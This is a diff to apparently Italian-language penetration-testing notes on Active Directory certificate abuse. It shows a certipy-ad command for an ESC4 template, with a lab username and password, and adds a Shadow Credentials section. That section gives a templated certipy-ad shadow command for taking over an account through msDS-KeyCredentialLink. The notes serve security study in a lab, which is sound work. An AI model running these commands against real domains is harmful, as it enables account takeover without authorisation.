@@ -69,3 +69,11 @@ Per riportarlo alla normalità
 certipy-ad template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
 ```
 ![[Pasted image 20230828151547.png]]
+### **Shadow Credentials**
+[Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
+Stealth e molto utile in caso di vero pentest.
+Ha bisogno dell'opzione msDS-KeyCredentialLink abilitata sull'account (Se hai genericWrite o genericAll su un account puoi abilitarla da solo)
+```bash
+certipy-ad shadow auto -u <USER>@<DOMAIN> -p '<PASS>' -account '<NOME TARGET>'
+```
+![[Pasted image 20230828173854.png]]
